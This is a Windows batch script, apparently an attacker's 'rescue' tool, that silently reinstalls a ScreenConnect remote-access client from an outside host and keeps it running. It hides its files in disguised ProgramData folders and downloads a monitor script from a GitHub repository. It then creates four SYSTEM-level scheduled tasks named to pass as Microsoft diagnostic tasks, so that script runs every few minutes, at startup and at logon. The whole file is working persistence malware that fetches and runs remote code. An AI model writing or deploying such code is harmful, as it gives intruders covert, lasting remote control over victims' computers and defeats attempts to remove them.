@echo off
setlocal EnableExtensions
REM RESCUE BUILD 20260802R1 — panic reinstall only (no nuke)
REM Use when SC was wiped and you need primary back ASAP.
net session >nul 2>&1
if errorlevel 1 (echo need Administrator & exit /b 5)

set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSICACHE=%WD%\pkg.msi"
set "MSI=%TEMP%\sc_rescue.msi"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
echo rescue_start %DATE% %TIME%>>"%LOG%"

del /f /q "%MSI%" >nul 2>&1
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%MSI%" "%MSIURL%"
if not exist "%MSI%" if exist "%MSICACHE%" copy /y "%MSICACHE%" "%MSI%" >nul
if not exist "%MSI%" (echo MSI download failed & echo rescue_msi_fail>>"%LOG%" & exit /b 1)
for %%A in ("%MSI%") do (
  echo msi_bytes=%%~zA
  if %%~zA LSS 500000 (echo MSI too small & exit /b 1)
  copy /y "%MSI%" "%MSICACHE%" >nul
)

msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress
echo msi_exit_%ERRORLEVEL%>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus REBOOT=ReallySuppress
echo msi_reinstall_%ERRORLEVEL%>>"%LOG%"

sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1

REM re-arm monitors from repo
curl.exe -L --ssl-no-revoke -o "%WD%\own_mon.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c \"%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd\"" >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1
schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c \"%WD%\own_mon.cmd\"" >nul 2>&1

sc query "%PRIM%"
sc query state= all | findstr /I ScreenConnect
echo rescue_done>>"%LOG%"
echo Done. If primary RUNNING, wait for console check-in.
exit /b 0
